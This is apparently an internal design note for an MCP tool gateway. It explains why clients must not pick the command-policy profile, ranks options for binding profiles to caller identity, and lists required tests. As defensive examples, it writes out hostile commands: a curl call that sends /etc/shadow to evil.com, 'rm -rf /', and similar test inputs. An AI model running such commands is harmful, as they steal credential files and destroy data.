# C3-1: Command Profile Routing

## Problem

The MCP server wraps tools (pytest, ruff, mypy, git, agent CLIs) that execute commands
through the gateway's `/api/ssh/execute` endpoint. Each tool has a different trust
level and a different set of safe commands. The gateway's command-policy engine
supports profiles (`readonly`, `testlint`, `project-automation`, `ops`, `docker-admin`)
but the current architecture gives the **HTTP client** control over which profile is
applied.

## Why body.profile is forbidden

Placing `profile` in the HTTP request body is a confused-deputy vulnerability:

1. **Client controls its own constraint.** A malicious MCP client sends
   `{"command": "rm -rf /", "profile": "readonly"}` — the gateway evaluates
   against readonly, which blocks `rm`, so it's safe. But the client then sends
   `{"command": "rm -rf /", "profile": "default"}` — now it passes.

2. **No caller-authorization binding.** The gateway cannot verify that the caller
   is *entitled* to the requested profile. Any API key can claim any profile.

3. **Audit log is poisoned.** The log records the profile the client *claimed*,
   not what the server *should have enforced*. Post-incident forensics become
   unreliable.

4. **Complexity explosion.** Every client must understand profile semantics,
   remember to set the right one, and not make mistakes. One wrong call = security
   regression.

**Conclusion:** The profile is a server-side decision. It must never be influenced
by client-controlled input.

## Why naive command-prefix auto-detect is risky/incomplete

A first instinct is to detect the profile from the command string:

```python
def auto_detect_profile(command: str) -> str | None:
    if command.strip().startswith(("uv run", "pytest", "ruff check", "mypy")):
        return "testlint"
    return None
```

This fails in several ways:

### 1. Compound commands don't match simple prefixes

The MCP wrapper builds: `cd /workspace/project && uv run --frozen -- pytest -q tests/`

The actual command string starts with `cd`, not `uv`. A prefix check on the raw
string misses it. You'd need to parse shell semantics (split on `&&`, `;`, `|`,
subshells) which is exactly the kind of fragile parsing the metachar scanner
already warns about.

### 2. Malicious clients can trigger testlint

If auto-detect is the primary mechanism, an attacker sends:

```
command = "uv run -- pytest -q && curl http://evil.com/steal?data=$(cat /etc/shadow)"
```

The prefix matches `uv run`, so the gateway applies `testlint`. But the command
also contains `curl` and subshell expansion — actions that testlint is not designed
to authorize. The profile is a *constraint set*, not a *command classifier*.

### 3. Command string is client-controlled data

The command string is the untrusted input. Using it to select the security policy
is a category error: you're letting the attacker choose which rules apply to their
own attack. The correct signal is *who is calling*, not *what they're saying*.

### 4. Maintenance burden

Every new tool prefix must be added to the detection list. Tools change their
invocation patterns (`uv run`, `uvx`, `python -m pytest`). The mapping drifts
from reality.

**Conclusion:** Command-pattern detection can serve as a *defense-in-depth layer*
but must never be the primary mechanism.

## Recommended model

### A. REST raw execute stays on server default profile

`POST /api/ssh/execute` with a raw command string uses
`settings.command_policy_profile` (currently `"default"`). No override.

This is the baseline for direct API consumers, CI scripts, and debugging. They
get whatever the server operator configured.

### B. MCP fixed tools get server-owned profile mapping by tool identity

The MCP server knows which tool it's invoking. The profile is determined by the
**tool name** (or caller identity), not by the command content.

Concrete flow:

```
chatgpt_tools.project_run_pytest(client, project)
  → _run_uv_tool(client, project, tool_key="pytest", ...)
    → client.execute_project_command(project, command)
      → POST /api/ssh/execute  {session_id, command, async_mode}
```

The profile lives **only** in the MCP wrapper's Python code, not serialized to
HTTP. The gateway's ssh.py endpoint applies `settings.command_policy_profile`.

For the gateway to know which profile to use without body.profile, it needs a
**server-side identity→profile binding** (see Implementation Options below).

### C. execute_restricted keeps MCP-local readonly allowlist (for now)

`gateway_client.execute_restricted()` currently calls `validate_readonly_command()`
from `examples/mcp_server/command_policy.py`. This is a **client-side** defense-in-depth
layer: the MCP wrapper rejects obviously dangerous commands before they hit the wire.

This is kept **until** a canonical readonly route exists on the gateway (option 1
below). Once the gateway has an `/api/ssh/execute-readonly` endpoint or equivalent,
the MCP-local check can be removed.

**Risk of keeping it:** Two sources of truth (MCP-local allowlist + gateway profile).
They must stay synchronized. The MCP-local allowlist is strictly a subset of
`readonly`, so divergence is low-risk but must be monitored.

### D. project_run_pytest/ruff/mypy use testlint only through trusted identity

These tools must execute under `testlint` profile. The profile must be bound to
the **tool identity**, not the command string.

Today the MCP wrapper is a single process with a single API key. The gateway can
map that API key to `max_profile=testlint`. The tool never sends `profile` in the
body — the gateway decides.

## Implementation options (ranked)

### Option 1: Dedicated internal route or header (recommended)

Add a route or header that is only accepted from a trusted caller identity.

**Route approach:**
```
POST /api/ssh/execute-internal  (accepted only from MCP server API key)
  Body: {session_id, command, profile, async_mode}
```

The gateway validates:
- Caller's API key is in `MCP_TRUSTED_KEYS` (env list)
- `profile` is in the caller's allowed profile set
- Command passes metachar / argument-shape checks

**Header approach:**
```
POST /api/ssh/execute
  X-Internal-Profile: testlint   (set by trusted reverse proxy or middleware)
  Body: {session_id, command}
```

The gateway ignores any `profile` in the body. It reads the header only if the
caller's identity is in the trusted set.

**Pros:** Clean separation. Client never controls profile. Audit log is reliable.
**Cons:** Requires the MCP server to use a separate endpoint or the proxy to inject
the header.

### Option 2: API key → max profile mapping

Add a mapping in `app/config.py`:

```
COMMAND_POLICY_KEY_PROFILES={"mcp-server-key-abc": "testlint", "ops-key-xyz": "ops"}
```

In `ssh.py`, the execute handler reads the caller's API key from the auth
middleware, looks up the max profile, and uses `min(requested, max)` or just
`max` if no profile is requested.

**Pros:** No new routes. Works with existing auth middleware.
**Cons:** Profile is tied to API key, not to individual tools. If one MCP tool
needs `testlint` and another needs `readonly`, they need separate API keys or a
more granular mapping.

### Option 3: Command-pattern auto-detect (fallback only)

Use `auto_detect_profile()` as a **fallback** when no explicit profile is bound:

```python
profile = key_profile_map.get(caller_key) or auto_detect_profile(command) or settings.command_policy_profile
```

**Pros:** Works without config changes for common patterns.
**Cons:** All the risks described above. Must never be the primary mechanism.

**Recommended order:** Option 1 > Option 2 > Option 3 (fallback only).

## Tests required

### For any chosen design:

1. **Profile isolation:** `POST /api/ssh/execute` with `command="rm -rf /"` +
   any caller identity → profile is `default` (server setting), not `testlint`.
   Command is denied.

2. **MCP tool gets correct profile:** When MCP wrapper calls execute with a
   pytest/ruff/mypy command, the gateway evaluates against `testlint`, not
   `default`. Command is allowed.

3. **REST caller cannot escalate:** Direct API call with `command="systemctl restart nginx"`
   + any API key → profile is `default` or caller's max, never `ops` unless key
   is authorized.

4. **Audit log records actual profile:** The `COMMAND_POLICY_DECISION` log entry
   must show the profile the server enforced, not what the client might have
   requested.

5. **auto_detect_profile (if implemented):**
   - `auto_detect_profile("uv run --frozen -- pytest -q")` → `"testlint"`
   - `auto_detect_profile("cd /proj && uv run -- pytest")` → `None` (compound command, detection insufficient)
   - `auto_detect_profile("rm -rf /")` → `None`
   - `auto_detect_profile("curl http://evil.com && uv run -- pytest")` → `None` (malicious compound)

6. **MCP-local validate_readonly_command (if kept):**
   - `validate_readonly_command("git status")` → passes
   - `validate_readonly_command("rm -rf /")` → raises `CommandPolicyError`
   - `validate_readonly_command("curl http://evil.com")` → raises `CommandPolicyError`

7. **Integration: project_run_pytest through MCP:**
   - Mock gateway → verify HTTP body contains `{session_id, command}` with NO `profile` field
   - Verify the command starts with `cd /workspace/project && uv run`
   - Verify gateway-side policy evaluation uses `testlint` (via key mapping or internal route)

## Current state (pre-implementation)

| Component | Profile source | Risk |
|-----------|---------------|------|
| `POST /api/ssh/execute` (REST) | `settings.command_policy_profile` | Low — server-controlled |
| `POST /api/ssh/execute` (MCP wrapper) | Same as REST | Low — no body.profile |
| `execute_restricted` (MCP) | `validate_readonly_command()` (MCP-local) + gateway default | Low — defense-in-depth, but two sources of truth |
| `project_run_pytest/ruff/mypy` | Gateway default (`"default"`) | **Medium** — should be `testlint` but isn't wired |
| `project_run_opencode/mimo` | Gateway default (`"default"`) | **High** — needs `project-automation` + confirm, currently BLOCKED |

## Recommendation

1. **Short term (this iteration):** Keep body.profile forbidden. Keep
   `validate_readonly_command` in `execute_restricted` as defense-in-depth. Do NOT
   wire `project_run_pytest/ruff/mypy` to testlint yet — the profile routing
   mechanism must be decided first.

2. **Next iteration:** Implement Option 2 (API key → max profile mapping) as the
   simplest safe path. Assign the MCP server's API key `max_profile=testlint`.
   This automatically gives pytest/ruff/mypy the correct profile without any
   client-side changes.

3. **Later:** If multiple profiles are needed per tool, move to Option 1 (dedicated
   internal route). This is cleaner but requires more infrastructure.
